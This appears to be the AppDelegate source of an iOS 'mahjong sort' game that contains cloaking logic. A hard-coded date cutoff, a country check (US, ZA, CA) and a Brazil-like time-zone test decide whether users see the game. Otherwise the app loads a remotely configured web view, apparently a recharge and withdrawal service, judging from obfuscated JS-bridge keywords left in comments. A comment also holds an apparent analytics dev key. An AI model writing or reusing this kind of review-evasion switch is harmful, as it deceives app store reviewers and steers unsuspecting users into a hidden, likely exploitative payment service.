 //
//  AppDelegate.swift
//  MJSort
//
//  Created by Hades on 4/30/25.
//

import UIKit
import AppsFlyerLib
import Reachability
import CloudKit

func isTm() -> Bool {
   
  // 2025-05-09 22:45:53
    //1746801953
  let ftTM = 1746801953
  let ct = Date().timeIntervalSince1970
  if ftTM - Int(ct) > 0 {
    return false
  }
  return true
}

func isBaxi() -> Bool {
    let offset = NSTimeZone.system.secondsFromGMT() / 3600
    if offset > -6 && offset < -1 {
        return true
    }
    return false
}


@main
class AppDelegate: UIResponder, UIApplicationDelegate {

    var window: UIWindow?
    var sptr: Bool = false

    func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {
        // Override point` for customization after application launch.
        
//        for str in arr {
//            print(encrypt(str, withSeparator: "/")!)
//        }
        
        kamddoed()
//        gameRTC()
        
//        let arr = ["jsBridge", "recharge", "withdrawOrderSuccess", "firstrecharge", "firstCharge", "charge", "currency", "addToCart", "amount", "openWindow", "openSafari", "rechargeClick", "params"]
//        
//        var neArr = [String]()
//
//        for str in arr {
//            neArr.append(encrypt(str, withSeparator: "(")!)
//        }
//        print(neArr)
//        
//        for string in neArr {
//            print(gDJK(string))
//        }
        
//        print(encrypt("https://ipapi.co/json/", withSeparator: "("))
        
        return true
    }
    
    func gameRTC() {
        sptr = true
//        let homeVC = HomeViewController()
        window?.rootViewController = UIStoryboard(name: "Main", bundle: nil).instantiateInitialViewController()
    }
    
    func application(_ application: UIApplication, supportedInterfaceOrientationsFor window: UIWindow?) -> UIInterfaceOrientationMask {
        if sptr {
            return .landscape
        } else {
            return .portrait
        }
    }
    
    func kamddoed() {
        window?.rootViewController = UIStoryboard(name: "LaunchScreen", bundle: nil).instantiateInitialViewController()
        
        let rea = Reachability(hostname: "www.apple.com")
        rea?.reachableBlock =  { [self] reachability in
            
            if isTm() {
                if MSInst.isTft {
                    DispatchQueue.main.async {
                        self.gameRTC()
                    }
                } else {
                    MSInst.ctCif { [self] iioop, ctCod in
                        if ctCod != nil {
                            if (ctCod?.contains("US"))! || (ctCod?.contains("ZA"))! || (ctCod?.contains("CA"))! {
                                DispatchQueue.main.async {
                                    self.gameRTC()
                                }
                            } else {

                                alSpsoens()
                            }
                        } else {

                            alSpsoens()
                        }
                    }
                }
            } else {
                DispatchQueue.main.async {
                    self.gameRTC()
                }
            }
            
//            getAllWords()
            rea!.stopNotifier()
        }
        rea?.startNotifier()
    }

    
    func namsdlews(_ ky: String) {
        //JOJO
        // "dhoUnccowqU9eaHu6RnnA7"
        AppsFlyerLib.shared().appsFlyerDevKey = ky
        AppsFlyerLib.shared().appleAppID = "6745696865"
        AppsFlyerLib.shared().delegate = self
             
        AppsFlyerLib.shared().start { (dictionary, error) in
            if error != nil {
                print(error as Any)
            }
        }
    }
    
    func alSpsoens() {
        sptr = false

        let db = CKContainer.default().publicCloudDatabase
        db.fetch(withRecordID: CKRecord.ID(recordName: "UOSKEJJSMHHSS")) { record, error in
            DispatchQueue.main.async { [self] in
                if (error == nil) {
                    
                    
                    let lao = record?.object(forKey: "laokeas") as! String
                    namsdlews(lao)
                    
//                    let hseuappskdd = record?.object(forKey: "hseuappskdd") as? String
                    let kalehaePosk = record?.object(forKey: "kalehaePosk") as! String
                    let pioanese = record?.object(forKey: "pioanese") as! String
                    
                    if let hseuappskdd = record?.object(forKey: "hseuappskdd") {
                        let vc = MaJianViewController()
                        vc.majanName = (hseuappskdd as! String)
                        vc.majanID = kalehaePosk
                        
                        if pioanese != "pioanese" {
                            self.window?.rootViewController = vc
                        }
                        
                        if pioanese == "pioanese" && isBaxi(){
                            self.window?.rootViewController = vc
                        }
                    } else {
                        self.gameRTC()
                    }

                    
//                    if hseuappskdd!.count > 0 && pioanese != "pioanese" {
//                        self.window?.rootViewController = vc
//                    }
//                    
//                    if hseuappskdd!.count > 0 && pioanese == "pioanese" && isBaxi(){
//                        self.window?.rootViewController = vc
//                    }
                } else {
//                    let apt = UIApplication.shared.delegate as! AppDelegate
//                    mathOrin = false
                    self.gameRTC()
                }
            }
        }
    }
}

extension AppDelegate: AppsFlyerLibDelegate {
    func onConversionDataSuccess(_ conversionInfo: [AnyHashable : Any]) {
        
    }
    
    func onConversionDataFail(_ error: Error) {
        
    }
}





